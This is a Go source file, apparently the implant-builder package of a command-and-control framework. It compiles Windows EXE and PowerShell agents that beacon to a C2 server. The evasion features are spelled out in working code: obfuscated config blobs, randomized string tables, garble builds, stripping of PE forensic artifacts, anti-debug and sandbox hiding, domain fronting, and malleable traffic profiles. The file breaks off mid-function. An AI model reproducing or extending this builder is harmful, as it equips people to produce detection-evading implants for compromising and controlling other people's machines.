package payload

import (
	"bytes"
	"context"
	"crypto/sha256"
	"embed"
	"encoding/hex"
	"encoding/json"
	"fmt"
	"os"
	"os/exec"
	"path/filepath"
	"regexp"
	"runtime"
	"sort"
	"strconv"
	"strings"
	"sync"
	"text/template"
	"time"
)

// buildTidyTimeout bounds a single `go mod tidy` invocation. Network stalls
// during module resolution are the most common cause of a hung build, so this
// is bounded separately from compilation.
const buildTidyTimeout = 6 * time.Minute

// buildCompileTimeout bounds a single `go build`/`garble build` invocation.
// With a single build worker this prevents one hung process (e.g. a CGO
// cross-compile hang) from blocking the entire build pipeline indefinitely.
const buildCompileTimeout = 15 * time.Minute

// buildTimeout is retained as the default bound for any other toolchain step
// (donut, stager, obfuscation) that has not been given a dedicated timeout.
const buildTimeout = buildCompileTimeout

//go:embed agent/* powershell_template.ps1 profiles/* loader/*.go
var payloadFS embed.FS

// ttlCache memoizes a resolved string (e.g. a toolchain path) but refreshes it
// after a TTL elapses. A one-shot sync.Once would never pick up environment
// changes (PATH/GOROOT updates, a freshly installed tool), so the resolver is
// re-run periodically. The zero value is not usable; construct with ttl and
// resolve set.
type ttlCache struct {
	mu      sync.Mutex
	value   string
	at      time.Time
	ttl     time.Duration
	resolve func() string
}

func (c *ttlCache) get() string {
	c.mu.Lock()
	defer c.mu.Unlock()
	if c.ttl > 0 && time.Since(c.at) < c.ttl {
		return c.value
	}
	c.value = c.resolve()
	c.at = time.Now()
	return c.value
}

// goCmdCacheTTL bounds how long a resolved go/garble path is trusted before a
// re-resolution. Short enough to pick up newly installed toolchains, long
// enough to avoid repeated filesystem/exec probes on the hot path.
const goCmdCacheTTL = 5 * time.Minute

var goCmdCache = &ttlCache{
	ttl:     goCmdCacheTTL,
	resolve: resolveGoCmd,
}

var garbleCmdCache = &ttlCache{
	ttl:     goCmdCacheTTL,
	resolve: resolveGarbleCmd,
}

// psEscape escapes a value for safe inclusion inside a double-quoted PowerShell
// string. Without it, a crafted value (e.g. from an imported malleable profile)
// containing `"`, a backtick, or `$(...)` could break out of the string or
// execute arbitrary PowerShell on the victim machine.
func psEscape(s string) string {
	s = strings.ReplaceAll(s, "`", "`\"")
	s = strings.ReplaceAll(s, "\"", "`\"")
	s = strings.ReplaceAll(s, "$", "`$")
	return s
}

// buildLdflags constructs the full -ldflags content string for go build.
// Agent runtime configuration is carried in a single XOR-obfuscated blob
// injected via -X main.ConfigBlob (see buildConfigBlobKeyed); everything else is
// resolved from the blob at agent init(). Only build-level flags remain.
// safeBuildFileName strips any directory components from a user-supplied
// output filename so that build artifacts can never be written outside the
// requested output directory via ".." segments or an absolute path (A1).
func safeBuildFileName(name string) string {
	return filepath.Base(name)
}

// buildLdflags returns the linker flags for the agent build. The runtime config
// blob and its per-build AES key are NOT passed here: embedding them on the go
// build command line would expose the secrets in the build process's argv where
// other local users could read them via process enumeration (B2). Instead they
// are delivered through an ephemeral generated source file — see
// writeConfigInjectFile — so the returned values are (ldflags, configBlob,
// sConfigKey).
func buildLdflags(cfg ImplantConfig, profile MalleableProfile, goos string) (string, string, string) {
	blob, sConfigKey := buildConfigBlobKeyed(cfg, profile)

	flags := "-s -w -buildid="
	if goos == "windows" {
		flags += " -H=windowsgui"
	}
	if cfg.SelfCheck {
		// Placeholder 64-char hex string, patched with the real binary SHA-256
		// after the build (see patchSelfCheckHash). The agent zeroes this exact
		// region before hashing so verification succeeds on the unmodified binary.
		flags += ` -X "main.SelfCheckSHA256Str=` + selfCheckPlaceholder + `"`
	}
	return flags, blob, sConfigKey
}

// writeConfigInjectFile writes an ephemeral Go source file into the agent build
// directory that sets the per-build runtime config blob and its AES key during
// package init(). Delivering secrets via this temp source file (instead of the
// go build argv) keeps them out of the build process command line (B2). The file
// lives only inside the throwaway build directory and is removed with it.
//
// The filename must sort BEFORE agent.go: Go runs a package's init() functions
// in source-file name order, and agent.go's init() calls loadConfigBlob() which
// reads ConfigBlob/SConfigKey. A name like zz_config_inject.go would run last,
// so the blob would still be empty when loadConfigBlob() executes and every
// build would silently fall back to build-time defaults.
func writeConfigInjectFile(workDir, configBlob, sConfigKey string) error {
	if configBlob == "" && sConfigKey == "" {
		return nil
	}
	src := "package main\n\n// Code-generated at build time; do not edit.\nfunc init() {\n"
	if configBlob != "" {
		src += "\tConfigBlob = " + strconv.Quote(configBlob) + "\n"
	}
	if sConfigKey != "" {
		src += "\tSConfigKey = " + strconv.Quote(sConfigKey) + "\n"
	}
	src += "}\n"
	return os.WriteFile(filepath.Join(workDir, "aa_config_inject.go"), []byte(src), 0644)
}

// selfCheckPlaceholder is the 64-'0' hex string injected at build time for the
// self-integrity hash. The builder replaces it with the real SHA-256 of the
// finalized binary. 64 zero hex chars are used because the patch is an
// in-place byte replacement of identical length, and a run of 512 zero bits is
// not expected to occur coincidentally in a real binary.
const selfCheckPlaceholder = "0000000000000000000000000000000000000000000000000000000000000000"

// patchSelfCheckHash computes the SHA-256 of the (already finalized) binary and
// overwrites the embedded selfCheckPlaceholder with that hash. The agent zeroes
// the embedded hash region before hashing, so a tampered binary fails the check.
// It must run AFTER every other post-build mutation (PE stripping, validation)
// so the embedded hash reflects the exact bytes the agent will read at runtime.
func patchSelfCheckHash(outPath string) error {
	if len(selfCheckPlaceholder) != 64 {
		return fmt.Errorf("internal: self-check placeholder is not 64 bytes")
	}
	data, err := os.ReadFile(outPath)
	if err != nil {
		return fmt.Errorf("read for self-check patch: %w", err)
	}
	idx := bytes.Index(data, []byte(selfCheckPlaceholder))
	if idx < 0 {
		return fmt.Errorf("self-check placeholder not found in built binary")
	}
	sum := sha256.Sum256(data)
	real := hex.EncodeToString(sum[:])
	if len(real) != 64 {
		return fmt.Errorf("internal: computed self-check hash is not 64 bytes")
	}
	copy(data[idx:idx+64], []byte(real))
	if err := os.WriteFile(outPath, data, 0755); err != nil {
		return fmt.Errorf("write self-check patch: %w", err)
	}
	return nil
}

// buildGoMod generates a go.mod file for the target OS.
func buildGoMod(goos string, isDLL bool) string {
	replaceDir := forgeC2ModuleReplace()

	deps := []string{}
	deps = append(deps, "\tgolang.org/x/sys v0.46.0")

	if !isDLL {
		deps = append(deps, "\tgolang.org/x/net v0.56.0")
	}

	if goos == "windows" {
		deps = append(deps, "\tgithub.com/Microsoft/go-winio v0.6.2")
		deps = append(deps, "\tmodernc.org/sqlite v1.52.0")
	}

	if goos == "windows" && !isDLL {
		deps = append(deps, "\tgoogle.golang.org/grpc v1.82.0")
		deps = append(deps, "\tnhooyr.io/websocket v1.8.17")
	}

	base := "module agent\n\ngo 1.25\n\nrequire (\n"
	base += strings.Join(deps, "\n") + "\n)\n"
	return base + replaceDir
}

// getGoCmd returns the path to the Go executable via a short-TTL cache so that
// environment changes (PATH/GOROOT updates, a freshly installed toolchain) are
// picked up without a restart.
func getGoCmd() string {
	return goCmdCache.get()
}

// resolveGoCmd performs the actual lookup for getGoCmd.
// It first tries exec.LookPath, then common installation locations (especially useful
// on Windows when the server.exe is launched without a full user PATH, e.g. by double-click).
func resolveGoCmd() string {
	// Allow overriding via environment (advanced users / CI)
	if goBinary := os.Getenv("GO_BINARY"); goBinary != "" {
		if _, err := os.Stat(goBinary); err == nil {
			return goBinary
		}
		// env var points to non-existent file; clear override and fall through
	}

	// Standard PATH lookup
	if goPath, err := exec.LookPath("go"); err == nil {
		return goPath
	}

	// Windows-specific fallbacks (very common issue when running built .exe)
	if runtime.GOOS == "windows" {
		home := os.Getenv("USERPROFILE")
		candidates := []string{
			filepath.Join(home, "go", "bin", "go.exe"),
			`C:\Program Files\Go\bin\go.exe`,
			`C:\Program Files (x86)\Go\bin\go.exe`,
		}

		// Support the user's common sdk layout (e.g. C:\Users\xxx\sdk\go1.xx\bin\go.exe)
		if sdkDir := filepath.Join(home, "sdk"); true {
			if entries, err := os.ReadDir(sdkDir); err == nil {
				for _, e := range entries {
					if strings.HasPrefix(strings.ToLower(e.Name()), "go") {
						c := filepath.Join(sdkDir, e.Name(), "bin", "go.exe")
						candidates = append(candidates, c)
					}
				}
			}
		}

		if goroot := os.Getenv("GOROOT"); goroot != "" {
			candidates = append(candidates, filepath.Join(goroot, "bin", "go.exe"))
		}
		if gopath := os.Getenv("GOPATH"); gopath != "" {
			candidates = append(candidates, filepath.Join(gopath, "bin", "go.exe"))
		}

		for _, c := range candidates {
			if _, err := os.Stat(c); err == nil {
				return c
			}
		}
	}
	return ""
}

// getGarbleCmd locates the garble binary via a short-TTL cache. Same robustness
// as getGoCmd: garble is typically installed via `go install`, landing in
// GOPATH/bin, which is often missing from PATH when the server runs as a service.
func getGarbleCmd() string {
	return garbleCmdCache.get()
}

// resolveGarbleCmd performs the actual lookup for getGarbleCmd.
func resolveGarbleCmd() string {
	if p, err := exec.LookPath("garble"); err == nil {
		return p
	}
	var candidates []string
	if gopath := os.Getenv("GOPATH"); gopath != "" {
		candidates = append(candidates, filepath.Join(gopath, "bin", "garble.exe"), filepath.Join(gopath, "bin", "garble"))
	}
	if home, err := os.UserHomeDir(); err == nil {
		candidates = append(candidates,
			filepath.Join(home, "go", "bin", "garble.exe"),
			filepath.Join(home, "go", "bin", "garble"))
	}
	for _, c := range candidates {
		if info, err := os.Stat(c); err == nil && !info.IsDir() {
			return c
		}
	}
	return ""
}

const defaultWindowsUA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"

const (
	// HTTP/HTTPS beacon endpoint (POST route registered in routes.go).
	defaultBeaconURI = "/api/v1/beacon"
	// WebSocket beacon endpoint (GET route registered in routes.go). The
	// server upgrades ONLY this path for beacon WebSockets, so a WSS build
	// must never keep the plain HTTP URI: the WS handshake would fail and
	// the agent would silently downgrade to HTTPS POST.
	defaultWSBeaconURI = "/ws/beacon"
)

func defaultMalleableProfile() MalleableProfile {
	return MalleableProfile{
		Name:      "default",
		UserAgent: defaultWindowsUA,
		BeaconURI: defaultBeaconURI,
		Method:    "POST",
		Headers:   map[string]string{"Accept": "*/*"},
		Sleep:     10,
		Jitter:    20,
	}
}

// UsesManualProfileSettings reports whether heartbeat/UA should come from the generate form.
func UsesManualProfileSettings(profile string) bool {
	return profile == "" || profile == "default"
}

func profileDataPath(dataDir, name string) string {
	if dataDir == "" {
		dataDir = "data"
	}
	sanitized := profileNameSanitizer.ReplaceAllString(strings.TrimSpace(name), "_")
	return filepath.Join(dataDir, "profiles", sanitized+".json")
}

func parseMalleableProfileJSON(data []byte, fallbackName string) MalleableProfile {
	var p MalleableProfile
	if err := json.Unmarshal(data, &p); err != nil {
		p = defaultMalleableProfile()
		if fallbackName != "" {
			p.Name = fallbackName
		}
		return p
	}
	if p.Name == "" {
		p.Name = fallbackName
	}
	if p.BeaconURI == "" {
		p.BeaconURI = defaultBeaconURI
	}
	if p.Method == "" {
		p.Method = "POST"
	}
	return p
}

// loadMalleableProfile loads a profile from data dir, embedded FS, or falls back to default.
func loadMalleableProfile(name string, dataDir string) MalleableProfile {
	if name == "" {
		name = "default"
	}
	// Sanitize the profile name so a request like "../../config" cannot escape
	// the profiles directory via path traversal (same guard used by
	// DeleteProfile / SaveProfile).
	name = profileNameSanitizer.ReplaceAllString(strings.TrimSpace(name), "_")
	if data, err := os.ReadFile(profileDataPath(dataDir, name)); err == nil {
		return parseMalleableProfileJSON(data, name)
	}
	profilePath := fmt.Sprintf("profiles/%s.json", name)
	if data, err := payloadFS.ReadFile(profilePath); err == nil {
		return parseMalleableProfileJSON(data, name)
	}
	p := defaultMalleableProfile()
	p.Name = name
	return p
}

// NormalizeImplantConfig applies profile rules:
// - default profile: keep manual interval/jitter/UA from the form
// - other/imported profiles: force interval/jitter/UA from the profile
func NormalizeImplantConfig(cfg *ImplantConfig, dataDir string) MalleableProfile {
	if cfg.C2URL == "" {
		cfg.C2URL = "http://127.0.0.1:8080"
	}
	if cfg.Protocol == "" {
		cfg.Protocol = "http"
	}

	profile := loadMalleableProfile(cfg.Profile, dataDir)
	cfg.BeaconURI = profile.BeaconURI
	cfg.Method = profile.Method
	// WebSocket builds must hit the server's WS upgrade path: the HTTP beacon
	// route is never upgraded, so a WSS build that keeps the default HTTP URI
	// would fail every handshake and silently slide back to HTTPS POST. Map
	// the default here (agent-side aliasing covers config_push overrides);
	// profiles that explicitly set a custom beacon_uri are honored as-is.
	if cfg.BeaconTransport == "wss" && (cfg.BeaconURI == "" || cfg.BeaconURI == defaultBeaconURI) {
		cfg.BeaconURI = defaultWSBeaconURI
	}
	// Carry the malleable response wrapping (prepend/append) into the config
	// blob so the agent can strip it on HTTP replies. Explicit per-build
	// values win over the profile file.
	if cfg.MalleablePrepend == "" {
		cfg.MalleablePrepend = profile.Prepend
	}
	if cfg.MalleableAppend == "" {
		cfg.MalleableAppend = profile.Append
	}
	if cfg.MalleableRequestPrepend == "" {
		cfg.MalleableRequestPrepend = profile.RequestPrepend
	}
	if cfg.MalleableRequestAppend == "" {
		cfg.MalleableRequestAppend = profile.RequestAppend
	}
	if cfg.MalleableRequestHeaders == nil {
		cfg.MalleableRequestHeaders = profile.RequestHeaders
	}

	if UsesManualProfileSettings(cfg.Profile) {
		if cfg.Interval < 0 {
			cfg.Interval = 5
		}
		if cfg.Jitter == 0 {
			cfg.Jitter = 20
		}
		cfg.Interval, cfg.Jitter = clampBeaconTiming(cfg.Interval, cfg.Jitter)
		if cfg.UserAgent == "" {
			if profile.UserAgent != "" {
				cfg.UserAgent = profile.UserAgent
			} else {
				cfg.UserAgent = defaultWindowsUA
			}
		}
		return profile
	}

	if profile.Sleep > 0 {
		cfg.Interval = profile.Sleep
	} else if cfg.Interval == 0 {
		cfg.Interval = 5
	}
	cfg.Jitter = profile.Jitter
	cfg.Interval, cfg.Jitter = clampBeaconTiming(cfg.Interval, cfg.Jitter)
	if profile.UserAgent != "" {
		cfg.UserAgent = profile.UserAgent
	} else {
		cfg.UserAgent = defaultWindowsUA
	}
	// Body-length jitter is bounded so the padded frame can never trip the
	// server's raw-body size guards (padding is stripped before envelope
	// decode, but the transport-level limit is checked on the raw bytes).
	if cfg.ContentLengthJitter < 0 {
		cfg.ContentLengthJitter = 0
	}
	if cfg.ContentLengthJitter > 4096 {
		cfg.ContentLengthJitter = 4096
	}
	return profile
}

// clampBeaconTiming bounds interval/jitter to sane ranges so a misconfigured
// (or attacker-influenced) profile can never produce a negative sleep that
// would panic time.NewTimer or trigger a beacon storm. Jitter is clamped to
// [0,100]% and interval to [1,86400]s.
func clampBeaconTiming(interval, jitter int) (int, int) {
	if jitter < 0 {
		jitter = 0
	}
	if jitter > 100 {
		jitter = 100
	}
	if interval < 1 {
		interval = 1
	}
	if interval > 86400 {
		interval = 86400
	}
	return interval, jitter
}

// ListProfilePresets returns built-in and imported profile metadata for the generate UI.
func ListProfilePresets(dataDir string) []MalleableProfile {
	seen := map[string]bool{}
	var out []MalleableProfile

	if entries, err := payloadFS.ReadDir("profiles"); err == nil {
		names := make([]string, 0, len(entries))
		for _, e := range entries {
			if e.IsDir() || !strings.HasSuffix(e.Name(), ".json") {
				continue
			}
			names = append(names, strings.TrimSuffix(e.Name(), ".json"))
		}
		sort.Strings(names)
		for _, name := range names {
			p := loadMalleableProfile(name, dataDir)
			out = append(out, p)
			seen[name] = true
		}
	}

	customDir := filepath.Join(dataDir, "profiles")
	if entries, err := os.ReadDir(customDir); err == nil {
		names := make([]string, 0, len(entries))
		for _, e := range entries {
			if e.IsDir() || !strings.HasSuffix(e.Name(), ".json") {
				continue
			}
			name := strings.TrimSuffix(e.Name(), ".json")
			if seen[name] {
				continue
			}
			names = append(names, name)
		}
		sort.Strings(names)
		for _, name := range names {
			p := loadMalleableProfile(name, dataDir)
			out = append(out, p)
		}
	}
	return out
}

var profileNameSanitizer = regexp.MustCompile(`[^a-zA-Z0-9_-]+`)

// profileFieldSafe rejects characters that would let a crafted profile break
// out of a double-quoted PowerShell string (or run $(...) subexpressions) once
// its fields are injected into the PowerShell agent template. Imported profiles
// are operator-supplied and must never be able to poison downstream builds.
func profileFieldSafe(s string) bool {
	if strings.ContainsAny(s, "`\"$") {
		return false
	}
	if strings.Contains(s, "{{") || strings.Contains(s, "}}") {
		return false
	}
	for _, r := range s {
		if r < 0x20 && r != '\t' {
			return false
		}
		if r == 0x7f {
			return false
		}
	}
	return true
}

// validateMalleableProfile ensures no field can be used to inject PowerShell
// when the profile is later baked into a PS1 agent.
func validateMalleableProfile(p MalleableProfile) error {
	if !profileFieldSafe(p.Name) {
		return fmt.Errorf("profile name contains invalid characters")
	}
	if !profileFieldSafe(p.Description) {
		return fmt.Errorf("profile description contains invalid characters")
	}
	if !profileFieldSafe(p.UserAgent) {
		return fmt.Errorf("user_agent contains invalid characters (quote, backtick, or $)")
	}
	if !profileFieldSafe(p.BeaconURI) {
		return fmt.Errorf("beacon_uri contains invalid characters")
	}
	if !profileFieldSafe(p.Method) {
		return fmt.Errorf("method contains invalid characters")
	}
	for k, v := range p.Headers {
		if !profileFieldSafe(k) || !profileFieldSafe(v) {
			return fmt.Errorf("header %q contains invalid characters", k)
		}
	}
	return nil
}

// SaveImportedProfile stores a user-uploaded profile JSON under data/profiles/.
func SaveImportedProfile(dataDir string, raw []byte) (MalleableProfile, error) {
	p := parseMalleableProfileJSON(raw, "")
	if p.Name == "" {
		return p, fmt.Errorf("profile name is required")
	}
	if err := validateMalleableProfile(p); err != nil {
		return p, err
	}
	p.Name = profileNameSanitizer.ReplaceAllString(strings.TrimSpace(p.Name), "_")
	if p.Name == "" {
		return p, fmt.Errorf("invalid profile name")
	}
	if dataDir == "" {
		dataDir = "data"
	}
	dir := filepath.Join(dataDir, "profiles")
	if err := os.MkdirAll(dir, 0750); err != nil {
		return p, err
	}
	p.Name = strings.TrimPrefix(p.Name, "default_")
	if p.Name == "default" {
		return p, fmt.Errorf("cannot override built-in default profile")
	}
	out, err := json.MarshalIndent(p, "", "  ")
	if err != nil {
		return p, err
	}
	if err := os.WriteFile(filepath.Join(dir, p.Name+".json"), out, 0644); err != nil {
		return p, err
	}
	return p, nil
}

// DeleteProfile removes a custom profile JSON from data/profiles/.
func DeleteProfile(dataDir string, name string) error {
	if dataDir == "" {
		dataDir = "data"
	}
	sanitized := profileNameSanitizer.ReplaceAllString(strings.TrimSpace(name), "_")
	if sanitized == "" || sanitized == "default" {
		return fmt.Errorf("cannot delete default profile")
	}
	path := filepath.Join(dataDir, "profiles", sanitized+".json")
	if _, err := os.Stat(path); os.IsNotExist(err) {
		return fmt.Errorf("profile not found")
	}
	return os.Remove(path)
}

// MalleableProfile defines customizable beacon behavior similar to Cobalt Strike.
type MalleableProfile struct {
	Name        string            `json:"name"`
	Description string            `json:"description"`
	UserAgent   string            `json:"user_agent"`
	BeaconURI   string            `json:"beacon_uri"`
	Method      string            `json:"method"` // GET or POST
	Headers     map[string]string `json:"headers"`
	Sleep       int               `json:"sleep"`
	Jitter      int               `json:"jitter"`
	Prepend     string            `json:"prepend,omitempty"` // bytes prepended to server HTTP responses
	Append      string            `json:"append,omitempty"`  // bytes appended to server HTTP responses
	// Request-side transforms (applied by the agent to outbound beacons).
	RequestPrepend string            `json:"request_prepend,omitempty"`
	RequestAppend  string            `json:"request_append,omitempty"`
	RequestHeaders map[string]string `json:"request_headers,omitempty"`
}

// ImplantConfig holds parameters injected into the generated agent (EXE or PS1).
// All agents must be produced exclusively through the Generate page.
type ImplantConfig struct {
	C2URL            string
	Protocol         string // http, tcp, p2p
	Interval         int
	Jitter           int
	UserAgent        string
	Persist          bool
	SkipTLSVerify    bool
	Filename         string // for output name
	Debug            bool   // for debug agent (shows console logs)
	Profile          string // malleable profile name
	BeaconURI        string
	Method           string
	ListenerID       uint
	P2PMode          string // "", "smb", "tcp" — how parent listens for children
	P2PParent        string // parent agent addr to connect to (child mode)
	P2PListenAddr    string // parent listen addr (pipe name or tcp addr)
	DNSDomain        string // DNS C2 domain (e.g. "c2.example.com")
	DNSServer        string // DNS C2 server IP
	Proxy            string // HTTP proxy URL (e.g. "http://proxy:8080")
	CryptoKey        string // 32-byte hex key for StreamCipher (empty = disabled)
	BeaconKey        string // PSK used to derive registration auth (empty = no PSK auth)
	RegSecretID      string // v3 per-implant registration secret id (compiled into the binary)
	RegSecret        string // v3 per-implant registration secret, base64 (replaces BeaconKey in v3 builds)
	ExpiryDate       string // Compile-time expiry date "YYYY-MM-DD" (empty = disabled)
	SelfCheck        bool   // Embed a SHA-256 self-integrity hash and verify it at startup (empty = disabled)
	MalleablePrepend string // bytes prepended to server HTTP responses (strip on parse)
	MalleableAppend  string // bytes appended to server HTTP responses (strip on parse)
	// Request-side malleable transforms: applied by the agent to the OUTGOING
	// beacon body and as request headers; the server strips the body wrapping
	// on inbound. Distinct from MalleablePrepend/Append (response-side).
	MalleableRequestPrepend string
	MalleableRequestAppend  string
	MalleableRequestHeaders map[string]string
	Evasion                 bool   // Enable chunked sleep obfuscation (Windows EDR basics)
	GhostMode               bool   // Enable ghost protocol (sandbox/anti-debug deep-hiding; opt-in, default off)
	Obfuscate               bool   // Enable garble build-time obfuscation (string/literal hiding)
	DomainFront             string // CDN front domain for domain fronting ("" = disabled)
	Architecture            string // "amd64" (default), "arm64", "arm"
	// Max random bytes appended to the HTTP/WS beacon body so the on-wire
	// body length varies per beacon (0=disabled). The server strips the
	// 8-byte length prefix on inbound; see stripBodyPadding/padBeaconBody.
	ContentLengthJitter int
	// Working hours
	WorkingStart string // HH:MM start of working hours (empty = disabled)
	WorkingEnd   string // HH:MM end of working hours (empty = disabled)
	WorkingTZ    string // IANA timezone (empty = UTC)
	// Advanced transport (injected as ldflags into agent)
	BeaconTransport  string // http, wss, grpc, ssh, dns, tcp, icmp, mtls, h2c
	DNSDoHURL        string
	DNSDoTAddr       string
	SSHUser          string
	SSHPassword      string
	SSHKey           string // base64 PEM client private key
	SSHHostKey       string // base64 server host public key pin (empty = lab insecure)
	PinnedCertSHA256 string // SHA-256 hex of server DER cert for pinning (empty = disabled)
	SelfCheckSHA256  string // SHA-256 hex of the binary itself for integrity verification (empty = disabled)
	// NetworkConfigOverWire, when set, produces a bootstrap-only binary: the
	// compile-time config blob embeds only the per-implant secret and the
	// initial C2 endpoint. The full network config is delivered by the server
	// at registration (encrypted under the same secret), keeping operational
	// parameters off the disk artifact.
	NetworkConfigOverWire bool
}

// forgeC2ModuleReplace returns a `replace` directive for the local
// github.com/forgec2/forgec2 module, so the temp agent build can
// find it without requiring a remote git repository.
func forgeC2ModuleReplace() string {
	// Walk upward from the working directory to find the module root
	// (handles the server running from the project root AND go test runs,
	// where the working directory is a subpackage).
	wd, err := os.Getwd()
	if err != nil {
		wd = "."
	}
	dir := wd
	for {
		if _, err := os.Stat(filepath.Join(dir, "go.mod")); err == nil {
			// go.mod replace targets must use forward slashes even on Windows.
			return "\nreplace github.com/forgec2/forgec2 => " + filepath.ToSlash(dir) + "\n"
		}
		parent := filepath.Dir(dir)
		if parent == dir || parent == "." || len(parent) <= len(filepath.VolumeName(parent)) {
			break
		}
		dir = parent
	}
	return ""
}

// GenerateWindowsEXE builds the Windows agent EXE (only via Generate page) using the embedded agent source + ldflags injection.
func GenerateWindowsEXE(cfg ImplantConfig, outputDir string) (string, error) {
	dataDir := filepath.Dir(outputDir)
	profile := NormalizeImplantConfig(&cfg, dataDir)

	// Create temp build dir
	tmpDir, err := os.MkdirTemp("", "forgec2-agent-*")
	if err != nil {
		return "", err
	}
	defer os.RemoveAll(tmpDir)

	// Make outputDir absolute to avoid issues with cmd.Dir
	if !filepath.IsAbs(outputDir) {
		if abs, err := filepath.Abs(outputDir); err == nil {
			outputDir = abs
		}
	}

	// Write agent source files from embed (supports agent.go + platform-specific agent_*.go)
	if err := extractAgentSources(payloadFS, tmpDir); err != nil {
		return "", err
	}

	// go.mod with required external dependencies
	goMod := buildGoMod("windows", false)

	if err := os.WriteFile(filepath.Join(tmpDir, "go.mod"), []byte(goMod), 0644); err != nil {
		return "", err
	}

	ldflags, blob, sKey := buildLdflags(cfg, profile, "windows")

	// Output filename
	outName := cfg.Filename
	if outName == "" {
		outName = "forgec2_agent.exe"
	}
	if !strings.HasSuffix(strings.ToLower(outName), ".exe") {
		outName += ".exe"
	}
	// Strip any directory components so a user-supplied filename containing
	// ".." or an absolute path cannot write outside outputDir (A1).
	outName = safeBuildFileName(outName)
	outPath := filepath.Join(outputDir, outName)
	if !filepath.IsAbs(outPath) {
		if abs, err := filepath.Abs(outPath); err == nil {
			outPath = abs
		}
	}
	// ensure the dir for outPath exists (use abs dir)
	outDir := filepath.Dir(outPath)
	if err := os.MkdirAll(outDir, 0750); err != nil {
		return "", err
	}

	// Run go mod tidy to resolve dependencies
	goCmd := getGoCmd()
	if goCmd == "" {
		return "", fmt.Errorf("go executable not found in PATH. Install Go from https://go.dev/dl/ or set the GO_BINARY environment variable")
	}
	if err := runGoModTidy(goCmd, tmpDir); err != nil {
		return "", err
	}

	// Build command - use explicit GOOS/GOARCH
	goarch, err := resolveBuildArch("windows", cfg.Architecture)
	if err != nil {
		return "", err
	}
	if err := buildAgentBinary(goCmd, tmpDir, ldflags, outPath, cfg.Obfuscate, "windows", goarch, blob, sKey); err != nil {
		return "", err
	}

	// Post-build: strip PE forensic artifacts (timestamp, Rich Header, Debug
	// directory). Applied to every build — garble does not clean these.
	stripPEArtifacts(outPath)

	// Self-integrity: embed the SHA-256 of the finalized binary (must run after
	// stripping so the hash matches what the agent reads at runtime).
	if cfg.SelfCheck {
		if err := patchSelfCheckHash(outPath); err != nil {
			return "", err
		}
	}

	// Fail loudly (rather than deliver a corrupt binary) if the produced exe is
	// malformed or the wrong architecture.
	if err := validatePE(outPath, windowsMachine(goarch)); err != nil {
		return "", fmt.Errorf("generated exe failed PE validation: %w", err)
	}

	if _, err := os.Stat(outPath); err != nil {
		return "", fmt.Errorf("build succeeded but no output file at %s: %w", outPath, err)
	}

	return outPath, nil
}

// GeneratePowerShellSource returns the complete PowerShell agent source code
// after executing the external template. This is the single source of truth.
func GeneratePowerShellSource(cfg ImplantConfig, dataDir string) (string, error) {
	NormalizeImplantConfig(&cfg, dataDir)

	tmplContent, err := payloadFS.ReadFile("powershell_template.ps1")
	if err != nil {
		return "", fmt.Errorf("powershell template not found in embed: %w", err)
	}

	tmpl, err := template.New("ps1").Funcs(template.FuncMap{"ps": psEscape}).Parse(string(tmplContent))
	if err != nil {
		return "", err
	}

	var buf bytes.Buffer
	if err := tmpl.Execute(&buf, cfg); err != nil {
		return "", err
	}
	return buf.String(), nil
}

// GeneratePowerShell creates a .ps1 agent file on disk (only via Generate page).
// Internally uses the full template.
func GeneratePowerShell(cfg ImplantConfig, outputDir string) (string, error) {
	ps1Code, err := GeneratePowerShellSource(cfg, filepath.Dir(outputDir))
	if err != nil {
		return "", err
	}

	outName := cfg.Filename
	if outName == "" {
		outName = "forgec2_agent.ps1"
	}
	outName = safeBuildFileName(outName)
	outPath := filepath.Join(outputDir, outName)
	if err := os.MkdirAll(outputDir, 0750); err != nil {
		return "", err
	}
	if err := os.WriteFile(outPath, []byte(ps1Code), 0644); err != nil {
		return "", err
	}
	return outPath, nil
}

// extractAgentSources writes ALL Go agent source files from the embedded FS
// into the temp build directory. This enables cross-platform builds (windows/linux).
func extractAgentSources(efs embed.FS, dir string) error {
	entries, err := efs.ReadDir("agent")
	if err != nil {
		return fmt.Errorf("failed to read embedded agent dir: %w", err)
	}
	hasAgentGo := false
	for _, entry := range entries {
		if entry.IsDir() || !strings.HasSuffix(entry.Name(), ".go") {
			continue
		}
		// Platform-specific sources use go:build tags; include all .go files so links resolve.
		if entry.Name() == "agent.go" {
			hasAgentGo = true
		}
		data, err := efs.ReadFile("agent/" + entry.Name())
		if err != nil {
			return fmt.Errorf("failed to read embedded agent/%s: %w", entry.Name(), err)
		}
		if err := os.WriteFile(filepath.Join(dir, entry.Name()), data, 0644); err != nil {
			return err
		}
	}
	if !hasAgentGo {
		return fmt.Errorf("embedded agent directory missing agent.go")
	}

	// Every agent build gets a freshly randomized string table (fresh XOR keys
	// per constant, plaintext comments stripped) so binaries are not
	// fingerprinter-friendly against a static table.
	if err := injectRandomizedStrxor(dir); err != nil {
		return err
	}
	return nil
}

// injectRandomizedStrxor regenerates agent/strxor.go inside the build dir with
// brand-new obfuscation values for this specific build.
func injectRandomizedStrxor(buildDir string) error {
	table, err := randomizeStrxor()
	if err != nil {
		return err
	}
	return os.WriteFile(filepath.Join(buildDir, "strxor.go"), table, 0644)
}

// runGoModTidy resolves go.sum entries for the temp build module. Every
// generate path must run this before `go build`; without it cross-builds
// fail with "missing go.sum entry" for OS-specific transitive imports.
func runGoModTidy(goCmd, workDir string) error {
	ctx, cancel := context.WithTimeout(context.Background(), buildTidyTimeout)
	defer cancel()
	tidyCmd := exec.CommandContext(ctx, goCmd, "mod", "tidy")
	tidyCmd.Dir = workDir
	var tidyOut, tidyErr bytes.Buffer
	tidyCmd.Stdout = &tidyOut
	tidyCmd.Stderr = &tidyErr
	if err := tidyCmd.Run(); err != nil {
		if ctx.Err() == context.DeadlineExceeded {
			return fmt.Errorf("go mod tidy timed out after %s (network/module-cache stall?): %w", buildTidyTimeout, err)
		}
		return fmt.Errorf("go mod tidy failed: %w\n%s\n%s", err, tidyOut.String(), tidyErr.String())
	}
	return nil
}

// scrubBuildLog redacts any injected ldflags secret values (the config blob and
// the per-build config key) from build-tooling output before it is returned in
// an error or persisted to a build log, so a failed build cannot leak the
// injected secrets into logs. It only redacts the exact secret token strings
// recovered from the ldflags; harmless output is left intact.
func scrubBuildLog(output, ldflags string) string {
	for _, key := range []string{"main.ConfigBlob", "main.SConfigKey"} {
		idx := strings.Index(ldflags, key+"=")
		if idx < 0 {
			continue
		}
		start := idx + len(key) + 1
		end := strings.IndexByte(ldflags[start:], '"')
